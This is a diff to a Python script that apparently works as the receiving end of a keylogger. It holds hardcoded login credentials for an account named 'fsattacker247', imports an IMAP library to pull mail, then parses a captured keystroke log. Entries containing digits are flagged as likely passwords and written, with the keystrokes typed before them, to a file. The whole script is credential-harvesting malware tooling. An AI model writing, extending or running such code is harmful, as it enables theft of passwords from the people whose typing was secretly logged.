@@ -1,6 +1,7 @@
 # Extract Mail
 import imaplib
 import email
+import re
 
 username = "fsattacker247@gmail.com"
 password = "FS123456789"
@@ -30,22 +31,26 @@ for log in inbox_item:
 # Create Key Parser
 log_file = "C:/Users/bradl/OneDrive/Folder/Git/log.txt"
 
-trail = 5
+trail = 3
 
 numList = ['0','1', '2', '3', '4', '5', '6', '7', '8', '9']
 with open (log_file, "r") as file:
     data = file.read()
     data = data[1:-1]
-    data = data.replace(" ", "").replace("[", "").replace("]", "").split("<SPACE>")
-    # data = data.replace("[", "")
-    # data = data.replace("]", "")
-    # data = data.split("<SPACE>")
+    data = data.replace("'", "").replace("[", "").replace("]", "").replace("<SPACE>", " ").split("<ENTER>")
     file.close()
 
+possiblePW = {}
+possiblePW_clean = {}
 with open ("possiblePW.txt", "w") as f:   
     for i in range(len(data)):
         for char in data[i]:
             if char in numList:
-                (f"POSSIBLE PW: {data[i]}")
+                possiblePW[data[i]] = []
                 for n in range(1,trail + 1):
-                    print (data[i - n])
+                    (possiblePW[data[i]].append(data[i - n]))
+
+    for k, v in possiblePW.items():
+        v.reverse()
+        f.writelines('%s:%s\n' % (k,v))
+    f.close()
